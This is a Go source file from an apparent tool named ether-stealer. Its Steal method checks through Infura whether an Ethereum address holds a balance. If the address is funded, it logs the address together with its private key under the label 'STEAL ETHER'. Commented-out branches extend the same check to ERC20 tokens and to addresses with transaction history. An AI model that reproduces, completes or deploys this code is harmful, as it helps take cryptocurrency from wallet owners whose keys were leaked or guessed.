package steal

import (
	"fmt"

	"github.com/ethereum/go-ethereum/common"

	"github.com/hexoul/ether-stealer/infura"
	"github.com/hexoul/ether-stealer/log"
)

type Stealer struct {
	infuraClient *infura.Infura
	logger       *log.Logger
}

func New() *Stealer {
	return &Stealer{infuraClient: infura.New(), logger: log.New()}
}

// Steal steals Ethereum through Infura.
func (s *Stealer) Steal(addr common.Address, privkey []byte) {
	addrStr := addr.String()
	if canStealEther, _ := s.infuraClient.HasBalance(addrStr); canStealEther {
		s.logger.Infof("STEAL ETHER from %s !!SECRET!! %x", addrStr, privkey)
		// } else if canCandidate, _ := hasTxCount(addrStr); canCandidate {
		// 	log.Infof("GOT CANDIDATE %s !!SECRET!! %x", addrStr, privkey)
		// } else if canStealERC := contract.CanSteal(addr); canStealERC != "" {
		// 	log.Infof("STEAL ERC20 from %s !!SECRET!! %x TARGET %s", addrStr, privkey, canStealERC)
	} else {
		fmt.Printf("FAILED from %s\n", addrStr)
	}
}
